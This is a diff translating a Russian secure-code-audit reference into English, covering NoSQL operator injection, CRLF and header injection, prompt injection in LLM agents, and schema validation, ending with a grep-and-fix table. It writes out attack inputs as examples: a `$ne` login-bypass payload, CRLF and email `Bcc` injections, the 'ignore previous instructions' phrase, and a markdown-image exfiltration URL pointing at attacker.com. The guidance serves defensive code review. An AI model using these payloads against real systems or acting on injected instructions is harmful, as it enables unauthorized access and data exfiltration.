+- **`$where` with arbitrary JS** — `{"$where": "this.a == this.b"}` executes
+  JavaScript **on the database server**. MongoDB's documentation does not describe
+  the isolation model of that context, so treat it as code execution rather than
+  "just a filter": CPU DoS and query-logic bypass at minimum. `$where` is
+  deprecated as of MongoDB 8.0; server-side JS is disabled entirely with
+  `security.javascriptEnabled: false` (or `--noscripting`), which is the fix.
+- **Aggregation pipelines from user input** — `$lookup` and `$merge` with
+  client-supplied parameters can read or write other collections.
+- **A query-string parser that builds objects** — `qs`/`express` parse
+  `?user[$ne]=1` into `{user: {"$ne": "1"}}` by default. An endpoint expecting a
+  string gets an object: the same operator injection with a GET parameter as the
+  source.
 
-**Как подтвердить:** отправить `{"password": {"$ne": null}}` (или
-`?password[$ne]=1`) на login-эндпоинт вместо строки, показать успешную
-аутентификацию без знания пароля.
+**How to confirm:** send `{"password": {"$ne": null}}` (or `?password[$ne]=1`) to
+the login endpoint instead of a string and show authentication succeeding without
+knowing the password.
 
-**Правильный фикс:** приведение типа до использования в запросе
-(`String(input.password)`), schema-валидация тела запроса (zod/joi/mongoose
-schema с `strict`), запрет операторов в пользовательском вводе
-(`mongo-sanitize` или эквивалент, вычищающий ключи с `$`/`.`), никогда не
-строить `$where` из пользовательских строк.
+**Correct fix:** cast types before the query (`String(input.password)`), schema
+validation on the body (zod/joi/mongoose with `strict`), reject `$`/`.` keys in
+user input (`mongo-sanitize` or equivalent), and never build `$where` from user
+strings.
 
-## 8. Header injection / CRLF
+## 10. Header injection / CRLF
 
-**Где искать:** значение заголовка ответа, `Location` при редиректе, поля
-письма, строка лога — везде, где пользовательская строка вставляется без
-проверки на `\r\n`.
+**Where to look:** response header values, `Location` on redirect, email fields,
+log lines — anywhere a user string is inserted without a `\r\n` check.
 
-- **CRLF в значение заголовка → response splitting** — `\r\n` внутри
-  значения, которое сервер вставляет в HTTP-заголовок без валидации,
-  обрывает заголовок и позволяет внедрить произвольные новые заголовки
-  или тело ответа (актуально для старых серверов/языков без встроенной
-  защиты; современные HTTP-либы часто блокируют `\r\n` в setHeader — но
-  проверять факт, не считать по умолчанию).
-- **Инъекция в `Set-Cookie`** — тот же вектор, добавление своих cookie
-  или изменение существующих через управляемое значение, попадающее в
-  строку `Set-Cookie`.
-- **Open redirect / `Location` из пользовательского ввода** — `?next=`,
-  `?returnUrl=` напрямую в `Location:` без проверки, что это
-  относительный путь или домен из allowlist — используется для фишинга
-  и для эскалации других уязвимостей (OAuth redirect_uri).
-- **Email header injection** — поле темы/имени отправителя с `\r\nBcc:
-  victim@x`, если попадает напрямую в заголовки письма (PHP `mail()`
-  классика, но воспроизводимо в любом языке при ручной сборке заголовков)
-  → скрытая рассылка спама через чужой почтовый сервер.
-- **Log injection / audit log forgery** — `\n` в значении, которое пишется
-  в лог как есть, подделывает вид записи (внедряет поддельную строку
-  `[INFO] user admin logged in`), сбивает парсинг лога и SIEM-алерты.
+- **CRLF in a header value → response splitting** — `\r\n` inside a value the
+  server writes into an HTTP header terminates it and allows injecting further
+  headers or a response body. Modern HTTP libraries often block `\r\n` in
+  `setHeader` — verify that, do not assume it.
+- **`Set-Cookie` injection** — the same vector, adding or modifying cookies
+  through a controlled value that reaches the `Set-Cookie` line.
+- **Open redirect / `Location` from user input** — `?next=`, `?returnUrl=` placed
+  straight into `Location:` with no check that it is a relative path or an
+  allowlisted domain; used for phishing and to escalate other bugs (OAuth
+  `redirect_uri`).
+- **Email header injection** — a subject or sender-name field carrying
+  `\r\nBcc: victim@x` when it goes straight into the message headers (the PHP
+  `mail()` classic, reproducible in any language that assembles headers by hand)
+  → hidden spam relayed through someone else's mail server.
+- **Log injection / audit-log forgery** — `\n` in a value written to the log
+  verbatim forges entries (injecting a fake `[INFO] user admin logged in`),
+  breaks log parsing, and defeats SIEM alerting.
 
-**Как подтвердить:** отправить значение с `%0d%0a` (`\r\n` в URL-кодировании)
-в поле, которое, по коду, идёт в заголовок/письмо/лог без проверки; показать
-итоговый сырой HTTP-ответ (не через клиент, который сам нормализует) или
-итоговую запись в логе/письме с внедрённой структурой.
+**How to confirm:** send a value containing `%0d%0a` into a field the code routes
+into a header, email, or log without checking, and show the raw HTTP response
+(not through a client that normalises it) or the resulting log/email entry with
+the injected structure.
 
-**Правильный фикс:** запрет `\r`/`\n` в значениях заголовков (большинство
-современных HTTP-библиотек это делает — проверить, что не отключено
-вручную), `Location` только на относительный путь или проверенный по
-allowlist домен, email — через библиотеку, которая сама эскейпит
-заголовки (не ручная конкатенация `To:`/`Subject:`), структурированное
-логирование (JSON-логгер) вместо конкатенации в текстовую строку.
+**Correct fix:** reject `\r`/`\n` in header values (most modern HTTP libraries
+do — check it has not been disabled), allow `Location` only to a relative path or
+an allowlisted domain, build email through a library that escapes headers itself
+(never hand-concatenated `To:`/`Subject:`), and use structured logging (a JSON
+logger) instead of string concatenation.
 
-## 9. Prompt injection в LLM-вызовах
+## 11. Prompt injection in LLM calls
 
-Класс, которого в типовом SAST-скилле ещё нет, потому что source здесь —
-не только прямой пользовательский ввод, но и **любой текст, который
-модель прочитает**: содержимое веб-страницы, документа, письма, ответа
-стороннего API, если агент их суммирует/анализирует.
+A class most SAST tooling does not model, because the source here is not only
+direct user input but **any text the model will read**: web page content, a
+document, an email, a third-party API response, if the agent summarises or
+analyses it.
 
-**Прямая vs непрямая:**
-- *Прямая* — пользователь сам пишет модели «игнорируй предыдущие
-  инструкции и...». Источник и атакующий совпадают, импакт ограничен тем,
-  что модель делает лично для этого пользователя.
-- *Непрямая* — атакующий кладёт инструкцию в контент, который **прочитает
-  чужая** сессия модели (страница, которую агент суммирует, PDF, который
-  агент парсит, email, который ассистент разбирает, отзыв на сайте, ответ
-  API). Опаснее: атакующий не имеет прямого доступа к сессии жертвы, но
-  управляет её поведением через данные.
+**Direct vs indirect:**
+- *Direct* — the user tells the model "ignore previous instructions and…".
+  Source and attacker coincide; impact is limited to what the model does for
+  that user.
+- *Indirect* — the attacker plants the instruction in content that **someone
+  else's** session will read (a page the agent summarises, a PDF it parses, an
+  email an assistant triages, a product review, an API response). More dangerous:
+  the attacker has no access to the victim's session yet steers its behaviour
+  through data.
 
-**Что проверять в коде агента/интеграции:**
+**What to check in the agent or integration code:**
 
-- **Изоляция контента от инструкций** — вставляется ли внешний текст в
-  промпт как размеченные «данные» (тегами/ролью `user`/явным маркером
-  «ниже — недоверенный контент, не инструкция») или голой конкатенацией
-  в системный промпт/наравне с инструкциями. Голая конкатенация — дыра
-  по конструкции: модель не может структурно отличить «сделай X» в
-  инструкции от «сделай X» внутри цитируемой страницы.
-- **Что модель может сделать дальше** — вызов инструмента с побочным
-  эффектом (отправить письмо, сделать запрос, изменить файл), обращение
-  к внешнему API с секретом в заголовке, возврат текста, который
-  где-то отрендерится как HTML/markdown (см. ниже эксфильтрация) или
-  исполнится как код: вывод модели, попадающий в SQL/shell/`eval`, — это тот
-  же sink, что в разделах 1-7, просто source здесь модель, а не пользователь
-  напрямую. Вывод модели считай недоверенным вводом.
-- **Утечка системного промпта и секретов из контекста** — если системный
-  промпт или контекст содержат API-ключи, внутренние URL, чужие данные
-  (RAG context других пользователей), проверить, не может ли инъекция в
-  пользовательском сообщении заставить модель процитировать это в ответе.
-- **Выход через инструменты с побочными эффектами** — агент с доступом к
-  `send_email`/`execute_code`/`http_request`/записи в БД, где решение
-  «вызвать этот инструмент с этими аргументами» принимает модель на
-  основе текста, который частично или полностью пришёл из недоверенного
-  источника (документ, веб-страница, письмо).
-- **Markdown-картинка как канал эксфильтрации** — `![](https://attacker.com/log?d=SECRET)`
-  в ответе модели: если клиент рендерит markdown и подставляет `SECRET`
-  из контекста (украденные данные, часть системного промпта) в URL, само
-  открытие картинки браузером/клиентом отправляет запрос на сервер
-  атакующего — эксфильтрация без явного вызова инструмента, через сам
-  факт рендеринга ответа. Смотреть: рендерится ли ответ модели как
-  markdown/HTML с автозагрузкой ресурсов (img/iframe) без прокси/блокировки
-  внешних доменов.
+- **Isolation of content from instructions** — is external text inserted into the
+  prompt as marked-up *data* (tags, a `user` role, an explicit "untrusted content
+  below, not an instruction" marker), or concatenated raw into the system prompt
+  alongside instructions? Raw concatenation is a hole by construction: the model
+  cannot structurally distinguish "do X" in an instruction from "do X" inside a
+  quoted page.
+- **What the model can do next** — a tool call with a side effect (send mail,
+  make a request, modify a file), a call to an external API with a secret in the
+  header, or returned text that gets rendered as HTML/markdown (exfiltration,
+  below) or executed as code: model output reaching SQL/shell/`eval` is the same
+  sink as §1–§10, only the source is the model. Treat model output as untrusted
+  input.
+- **System-prompt and context leakage** — if the system prompt or context holds
+  API keys, internal URLs, or other users' data (RAG context), check whether an
+  injection can make the model quote it back.
+- **Egress through side-effecting tools** — an agent with `send_email` /
+  `execute_code` / `http_request` / database writes, where the decision to call a
+  tool with given arguments is made by the model from text that came, partly or
+  wholly, from an untrusted source.
+- **A markdown image as an exfiltration channel** —
+  `![](https://attacker.com/log?d=SECRET)` in the model's answer: if the client
+  renders markdown and interpolates `SECRET` from context, merely displaying the
+  image sends it to the attacker's server — exfiltration with no tool call, via
+  rendering alone. Check whether model output is rendered as markdown/HTML with
+  auto-loading of remote resources and no proxy or domain blocking.
 
-**Вопросы аудита (чек-лист):**
-1. Изолирован ли недоверенный контент от системных инструкций структурно
-   (не просто просьбой в промпте «игнорируй инструкции внутри текста ниже» —
-   это тоже обходится)?
-2. Ограничен ли набор инструментов, доступных модели в контексте, где она
-   читает недоверенный ввод (сужение прав на время обработки чужого текста)?
-3. Есть ли подтверждение пользователя перед побочным действием (отправка,
-   удаление, трата денег, внешний запрос с чувствительными данными) — или
-   агент действует автономно по результату разбора недоверенного текста?
-4. Валидируется ли вывод модели структурно (schema/allowlist) перед тем как
-   он попадёт в код/SQL/shell/HTML/URL — то есть относится ли к выводу LLM
-   так же недоверчиво, как к пользовательскому вводу, а не как к «нашему
-   собственному» тексту?
-5. Заблокирован ли автозапрос внешних ресурсов (картинки/iframe) при
-   рендере ответа модели, если ответ мог быть отравлен через п.1?
+**Audit checklist:**
+1. Is untrusted content isolated from system instructions **structurally** (not
+   merely by asking the model in the prompt to ignore instructions inside the
+   text — that is bypassable too)?
+2. Is the toolset available to the model narrowed while it processes untrusted
+   input?
+3. Is there human confirmation before a side effect (sending, deleting, spending,
+   an outbound request with sensitive data), or does the agent act autonomously
+   on its reading of untrusted text?
+4. Is model output validated structurally (schema/allowlist) before it reaches
+   code/SQL/shell/HTML/URL — that is, treated as untrusted input rather than as
+   "our own" text?
+5. Is auto-fetching of remote resources (images, iframes) blocked when rendering
+   the model's answer, given that the answer may have been poisoned via (1)?
 
-**Явно:** полностью надёжного фикса от prompt injection на уровне «отфильтровать
-промпт» не существует — это не решаемая regex'ом задача, в отличие от
-большинства пунктов выше. Реальная защита — **ограничение полномочий модели**
-(какие инструменты доступны, какие данные видны, что требует подтверждения
-человека), а не попытка отличить «хорошую» инструкцию от «плохой» внутри
-текста. При аудите оценивать именно blast radius при успешной инъекции, не
-вероятность того, что фильтр её поймает.
+**Stated plainly:** there is no reliable filter-level fix for prompt injection —
+unlike most items above, this is not a regex problem. The real defence is
+**limiting the model's authority** (which tools are reachable, which data is
+visible, what requires human confirmation), not trying to tell a "good"
+instruction from a "bad" one inside text. Audit the blast radius of a successful
+injection, not the odds of a filter catching it.
 
-## 10. Отсутствие schema-валидации на границе
+## 12. Missing schema validation at the boundary
 
-Не отдельный sink, а системная причина большинства пунктов выше: обработчик
-берёт `req.body`/`req.query` напрямую (JS-объект/dict без проверки формы) и
-передаёт дальше — в SQL-конструктор, в merge, в бизнес-логику. Последствия:
+Not a sink of its own but the systemic cause of much of the above: a handler
+takes `req.body`/`req.query` directly (an unchecked object/dict) and passes it
+onward — into a query builder, a merge, business logic. Consequences:
 
-- Поле неожиданного типа (объект вместо строки) доходит до sink, который
-  рассчитывал на строку — см. NoSQL-инъекцию (п.7), где `password` внезапно
-  объект `{$ne: null}`.
-- Лишние поля, которых обработчик не ожидал, проходят до слоя, который их
-  использует без спроса — это **mass assignment / BOPLA**, уже разобрано в
-  `SKILL.md` (см. раздел про privilege escalation через лишние поля тела
-  запроса) — не дублируется здесь, см. основной файл скилла.
+- A field of an unexpected type (an object where a string was assumed) reaches a
+  sink that assumed a string — see §9, where `password` is suddenly `{$ne: null}`.
+- Extra fields the handler never expected pass through to a layer that uses them
+  unasked — **mass assignment / BOPLA**, covered in `SKILL.md` (privilege
+  escalation through extra body fields); see the main skill file rather than a
+  duplicate here.
 
-**Проверка:** есть ли на входной границе (сразу после парсинга тела
-запроса, до бизнес-логики) явная schema (zod/pydantic/joi/express-validator/
-class-validator) со `strict`/`additionalProperties: false`, или код читает
-поля из сырого объекта по мере необходимости, неявно доверяя форме входа.
+**The check:** is there an explicit schema at the input boundary (immediately
+after body parsing, before business logic) — zod/pydantic/joi/express-validator/
+class-validator with `strict`/`additionalProperties: false` — or does the code
+read fields off a raw object as needed, implicitly trusting the shape of input?
 
-## Сводная таблица: sink → grep → фикс
+## Summary: sink → grep → fix
 
-| Sink | Искать grep'ом | Правильный фикс |
+| Sink | Grep for | Correct fix |
 |---|---|---|
-| Command injection | `shell=True`, `os.system(`, `exec(`, `child_process.exec(`, `` `sh -c` ``, `` \`.*\$\{ `` | список аргументов без shell, `--` перед пользовательскими аргументами, allowlist бинарей |
-| Path traversal | `os.path.join(.*request`, `path.join(.*req\.`, `fs.readFile(.*req\.`, `send_file(`, `zipfile.extractall(` | `realpath`/`resolve` + проверка префикса канонического пути |
-| File upload | `request.files`, `multer(`, `.filename`, `Content-Type.*request` | проверка magic bytes, серверное имя файла, раздача с отдельного домена без выполнения скриптов |
-| Deserialization | `pickle.loads(`, `yaml.load(` без `SafeLoader`, `marshal.loads(`, `ObjectInputStream`, `Object.assign(.*req\.body` | JSON+schema вместо pickle/marshal, `yaml.safe_load`, санитизация `__proto__`/`constructor` при merge |
-| SSTI | `render_template_string(`, `Template(.*request`, `\.compile\(req\.`, `createTemplate(` | пользовательский ввод только в контекст рендера, никогда в текст шаблона |
-| XSS | `dangerouslySetInnerHTML`, `v-html`, `innerHTML\s*=`, `document\.write(`, `\|safe`, `bypassSecurityTrust`, `{{{` | контекстный автоэскейпинг фреймворка, `textContent`, DOMPurify при реальной нужде в HTML |
-| NoSQL injection | `req.body` напрямую в `.find(`/`.findOne(`, `$where`, `$regex.*req\.` | приведение типа + schema-валидация, запрет операторных ключей во входе |
-| Header/CRLF injection | `res.setHeader(.*req\.`, `Location.*req\.query`, `mail(.*\$_`, `logger\.(info\|warn)\(.*req\.` | запрет `\r\n` в значениях, allowlist для redirect-домена, структурированное логирование |
-| Prompt injection | конкатенация внешнего текста (fetch/файл/письмо) в системный промпт, вызов инструмента по результату парсинга такого текста | изоляция данных от инструкций, ограничение инструментов, подтверждение перед побочным действием, валидация вывода модели как недоверенного ввода |
-| Missing schema validation | обработчик роута без `zod.parse`/`pydantic`/`joi.validate` перед использованием `req.body`/`req.query` | strict schema на границе, отбрасывать лишние поля (см. BOPLA в SKILL.md) |
+| SQL injection | `execute(f"`, `execute("... " +`, `.format(`, `` query(`...${ ``, `queryRawUnsafe`, `knex.raw`, `.extra(`, `text(f"` | prepared statements with bound parameters; allowlist map for dynamic identifiers; least-privilege DB account |
+| Command injection | `shell=True`, `os.system(`, `exec(`, `child_process.exec(`, `` `sh -c` `` | argument list without a shell, `--` before user arguments, allowlist of binaries |
+| Path traversal | `os.path.join(.*request`, `path.join(.*req\.`, `fs.readFile(.*req\.`, `send_file(`, `zipfile.extractall(` | `realpath`/`resolve` plus canonical prefix check |
+| File upload | `request.files`, `multer(`, `.filename`, `Content-Type.*request` | magic-byte validation, server-side filename, serving from a non-executing separate domain |
+| Deserialisation | `pickle.loads(`, `yaml.load(` without `SafeLoader`, `marshal.loads(`, `ObjectInputStream`, `Object.assign(.*req\.body` | JSON+schema instead of pickle/marshal, `yaml.safe_load`, reject `__proto__`/`constructor` on merge |
+| XXE / XML | `etree.parse`, `minidom`, `xml.sax`, `DocumentBuilderFactory`, `libxmljs`, `resolve_entities`, `noent` | disable DTDs and external entities, use `defusedxml` or a hardened parser, cap size and expansion |
+| SSTI | `render_template_string(`, `Template(.*request`, `\.compile\(req\.`, `createTemplate(` | user input only in the render context, never in template source |
+| XSS | `dangerouslySetInnerHTML`, `v-html`, `innerHTML\s*=`, `document\.write(`, `\|safe`, `bypassSecurityTrust`, `{{{` | framework context-aware auto-escaping, `textContent`, DOMPurify when HTML is genuinely required |
+| NoSQL injection | `req.body` straight into `.find(`/`.findOne(`, `$where`, `$regex.*req\.` | type casting plus schema validation, reject operator keys in input |
+| Header/CRLF injection | `res.setHeader(.*req\.`, `Location.*req\.query`, `mail(.*\$_`, `logger\.(info\|warn)\(.*req\.` | reject `\r\n` in values, allowlist redirect domains, structured logging |
+| Prompt injection | external text (fetch/file/email) concatenated into a system prompt; a tool called on the result of parsing such text | isolate data from instructions, narrow the toolset, confirm before side effects, validate model output as untrusted |
+| Missing schema validation | a route handler with no `zod.parse`/`pydantic`/`joi.validate` before using `req.body`/`req.query` | strict schema at the boundary, drop unknown fields (see BOPLA in SKILL.md) |
